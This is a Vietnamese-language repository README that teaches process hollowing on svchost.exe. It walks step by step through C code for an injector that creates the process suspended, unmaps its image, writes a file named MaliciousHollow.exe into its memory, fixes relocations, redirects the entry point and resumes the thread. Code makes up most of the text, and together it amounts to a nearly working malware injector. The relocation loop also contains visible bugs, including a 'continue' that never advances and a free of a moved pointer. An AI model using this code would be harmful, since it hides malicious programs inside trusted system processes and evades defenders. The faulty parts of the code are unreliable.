# ProcHollow
Repository này thực hiện xây dựng một chương trình tiến hành kỹ thuật Process Hollowing trên tiến trình svchost.exe.
# Một số kiến thức
Tham khảo từ https://hackmd.io/@Wh04m1/Sk4ZLgGc6
Khi tiến hành tạo một process, Kernel mở file thực thi và kiểm tra -> File PE hợp lệ thì kernel tạo 1 kernel process object và 1 kernel thread object đại diện cho process và thread mới -> kernwl ánh xạ image và NTDLL.DLL vào không gian bộ nhớ của tiến trình
-> thông báo cho tiến trình quản lý csrss.exe về process mới được tạo.

Tới đây, một tiến trình được kernel coi là khởi tạo thành công. Tiếp theo là quá trình khởi tạo context bên trong process.
Đối tượng quản lý process ở không gian người dùng là Process Environment Block và Thread Environment Block được khởi tạo -> Khởi tạo các thuộc tính khác, như heap, thread pool -> Tải các DLL cần thiết -> Khởi chạy tại entry point.

Nếu sử dụng API CreateProcess() với cờ CREATE_SUSPENDED, process mới được tạo sẽ ở trạng thái ngưng và chỉ có thể tiếp tục bằng API ResumeThread(). Khi được tạo ở trạng thái này, process sẽ được khởi tại đến bước tạo PEB và TEB, còn các quá trình
tạo heap, tải DLL, chạy tại entry point vẫn chưa được thực hiện. Kỹ thuật Process Hollowing sẽ lợi dụng điều này: tại một process bị suspended, xóa bỏ image gốc được nạp ban đầu, thay thế bằng image độc hại, thiết lập các context của image cho phù hợp và khiến process
chạy image độc hại thay vì chương trình ban đầu.

# Các bước thực hiện
Tại phần mềm injector, trước hết cần định nghĩa một số function và cấu trúc quan trọng cần dùng
```C
typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcInfoClass,
	PVOID ProcInfor, ULONG ProcInfoLen, PULONG ReturnLen);
HMODULE hNTDLL = GetModuleHandleA("NTDLL.DLL");	// Mo NTDLL
// Lay dia chi ham NtUnmapViewOfSection
pfnNtUnmapViewOfSection pNtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
pfnNtQueryInformationProcess pNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNTDLL, "NtQueryInformationProcess");
```
NtQueryInformationProcess là API dùng để lấy thông tin của Process, NtUnmapViewOfSection là API dùng để unmap vùng nhớ đã được cấp phát. Hai Native API này của Windows, được định nghĩa trong thư viện NTDLL.DLL
nhưng chưa được khai báo sẵn trong Windows SDL nên cần khai báo con trỏ hàm cho 2 API này để gán vào địa chỉ hàm đọc từ NTDLL ra.

Tiếp theo là định nghĩa một số cấu trúc struct chưa được định nghĩa đầy đủ là PEB_LDR_DATA, PEB_FREE_BLOCK, _UNICODE_STR, PEB, IMAGE_RELOC
## 1. Tạo mới process
Tạo mới process với API CreateProcess() trong đó cần truyền vào đường dẫn của tiến trình nạn nhân, cờ CREATE_SUSPENDED và hai struct STARTUPINFO + PROCESS_INFORMATION. STARTUPINFO là một cấu trúc dùng để chỉ định các thuộc tính khởi tạo của một tiến trình
gồm cách cửa sổ tiến trình hiển thị, giao diện và môi trường chạy. 
```C
typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;
  HANDLE hThread;
  DWORD  dwProcessId;
  DWORD  dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION;

```
PROCESS_INFORMATION là cấu trúc chứa thông tin về tiến trình và luồng chính được tạo ra, nhận lại thông tin về tiến trình: handle Process và Thread, ProcessId, ThreadId.
```C
STARTUPINFO si;
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
WCHAR victim[] = L"C:\\Windows\\System32\\svchost.exe";
if (!CreateProcess(NULL,    // No module name
    victim,                // CommandLine chua duong dan tien trinh duoc thuc thi
    NULL,                   // Process handle khong duoc ke thua
    NULL,                   // Thread handle khong duoc ke thua
    FALSE,                  // Handle khong duoc ke thua
    CREATE_SUSPENDED,       // creation flag == suspend
    NULL,                   // Su dung parent's environment block
    NULL,                   // Su dung start directiory cua parent
    &si,                    // pointer toi STARTUPINFO
    &pi                     // pointer toi PROCESS_INFORMATION
))
{
    std::cout << "Create process fail." << GetLastError() << std::endl;
    return 1;
}
```
Sau khi tạo tiến trình bị suspended, đọc thông tin của qua NtQueryInformationProcess, sử dụng struct PROCESS_BASIC_INFORMATION
```C
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB  PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
```
Sử dụng ReadProcessMemory để đọc thông tin tại địa chỉ PebBaseAddress vào một biến PEB. Lấy được PEB.lpImageBaseAddress và Base Image Address của tiến trình.
Sử dụng NtUnmapViewOfSection để unmap vùng nhớ địa chỉ lpImageBaseAddress.

## 2. Tải image mới vào vùng nhớ đã hollowing
Mở và đọc file thực thi của tiến trình độc hại.
```C
WCHAR imagePath[] = L"..\\MaliciousHollow.exe";
HANDLE hFile = CreateFileW(imagePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); // mo file
DWORD rawImageSize = GetFileSize(hFile, NULL);	// lay kich thuoc file
LPVOID buffer = VirtualAlloc(NULL, rawImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
ReadFile(hFile, buffer, rawImageSize, NULL, NULL); // doc file, ghi vao buffer
CloseHandle(hFile);
```
Sau đó, cấp phát vùng nhớ tại chính vị trí đã hollowing, với kích thước là kích thước image tiến trình độc hại
```C
PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)buffer + ((PIMAGE_DOS_HEADER)buffer)->e_lfanew);
LPVOID imageBase = VirtualAllocEx(pi.hProcess, peb.lpImageBaseAddress, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```
Ta sẽ copy header và các section vào vùng nhớ này. Theo Copilot giải thích, một số chương trình như SVCHOST.EXE có cơ chế kiểm tra nội bộ PEB->ImageBaseAddress nên cần phải cập nhật lại header của image giá trị ImageBase mới giống với PEB
của tiến trình SVCHOST.EXE rồi mới copy header vào vùng nhớ.
```C
ULONG_PTR delta = (ULONG_PTR)imageBase - ntHeader->OptionalHeader.ImageBase;
ntHeader->OptionalHeader.ImageBase = (ULONG_PTR)imageBase;
ULONG_PTR uValueA = ntHeader->OptionalHeader.SizeOfHeaders;
// copy header
WriteProcessMemory(pi.hProcess, imageBase, buffer, uValueA, NULL);
// copy section
uValueA = (ULONG_PTR)ntHeader + sizeof(IMAGE_NT_HEADERS);
ULONG_PTR uValueB = ntHeader->FileHeader.NumberOfSections;
while (uValueB)
{
	ULONG_PTR Src = (ULONG_PTR)buffer + ((PIMAGE_SECTION_HEADER)uValueA)->PointerToRawData;
	ULONG_PTR Des = (ULONG_PTR)imageBase + ((PIMAGE_SECTION_HEADER)uValueA)->VirtualAddress;
	WriteProcessMemory(pi.hProcess, (LPVOID)Des, (LPVOID)Src, (((PIMAGE_SECTION_HEADER)uValueA)->SizeOfRawData), NULL);
	// to next section
	uValueA += sizeof(IMAGE_SECTION_HEADER);
	uValueB--;
}
```
Trong quá trình sao chép image này, chúng ra sẽ tiến hành cả xử lý Relocation. Lưu ý, khác với Reflective DLL injection, nơi mà ReflectiveLoader thực thi là trong nội bộ tiến trình nạn nhân nên nó có thể truy cập trực tiếp vùng nhớ Relocation qua con trỏ.
Ở đây, injector đóng vai trò là một tiến trình bên ngoài tiến trình SVCHOST.EXE nên không thể truy cập trực tiếp vùng nhớ đã ghi vào trong SVCHOST.EXE. Cần phải dùng ReadProcessMemory đọc Reloc Table, sau đóc duyệt qua Reloc Table.
Với mỗi entry, sử dụng ReadProcessMemory để lấy ra giá trị Reloc, cộng delta ImageBase và ghi lại qua WriteProcessMemory.
```C
PIMAGE_DATA_DIRECTORY RelocDir = &(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);

if (delta)
{
	if (RelocDir->Size)
	{
		uValueA = (ULONG_PTR)imageBase + RelocDir->VirtualAddress; // dia chi cua reloc table trong bo nho
		LPVOID RelocBuffer = VirtualAlloc(NULL, RelocDir->Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		ReadProcessMemory(pi.hProcess, (LPVOID)uValueA, RelocBuffer, RelocDir->Size, NULL);
		// Image dang nam tren vung nho nam ngoai pham vi truy cap truc tiep cua con tro thuoc ProHollow, can Read, Write Process
		while (((PIMAGE_BASE_RELOCATION)RelocBuffer)->SizeOfBlock)
		{
			// Lay dia chi page tuong ung voi relocation block nay
			uValueB = (ULONG_PTR)imageBase + ((PIMAGE_BASE_RELOCATION)RelocBuffer)->VirtualAddress;
			ULONG_PTR numberEntry = (((PIMAGE_BASE_RELOCATION)RelocBuffer)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
			PIMAGE_RELOC pEntry = (PIMAGE_RELOC)((ULONG_PTR)RelocBuffer + sizeof(IMAGE_BASE_RELOCATION));// Dang o day
			while (numberEntry)
			{

				if (pEntry->type == 0)
					continue;
				ULONG_PTR relocPos = uValueB + pEntry->offset;
				ULONG_PTR relocPosData = 0;
				BOOL c =ReadProcessMemory(pi.hProcess, (LPVOID)relocPos, &relocPosData, sizeof(relocPosData), NULL);
				relocPosData += delta;
				BOOL d = WriteProcessMemory(pi.hProcess, (LPVOID)relocPos, &relocPosData, sizeof(relocPosData), NULL);
				// next
				pEntry++;
				numberEntry--;
			}
			RelocBuffer = (LPVOID)((ULONG_PTR)RelocBuffer + ((PIMAGE_BASE_RELOCATION)RelocBuffer)->SizeOfBlock);
		}

		VirtualFree(RelocBuffer, 0, MEM_RELEASE);
	}
}
```
## 3. Cập nhật giá trị entry point cho tiến trình SVCHOST.EXE
```C
CONTEXT context = { 0 };
context.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &context);
context.Rcx = (ULONG_PTR)imageBase + ntHeader->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(pi.hThread, &context);
```
## 4. Gọi ResumeThread
```C
ResumeThread(pi.hThread);
```
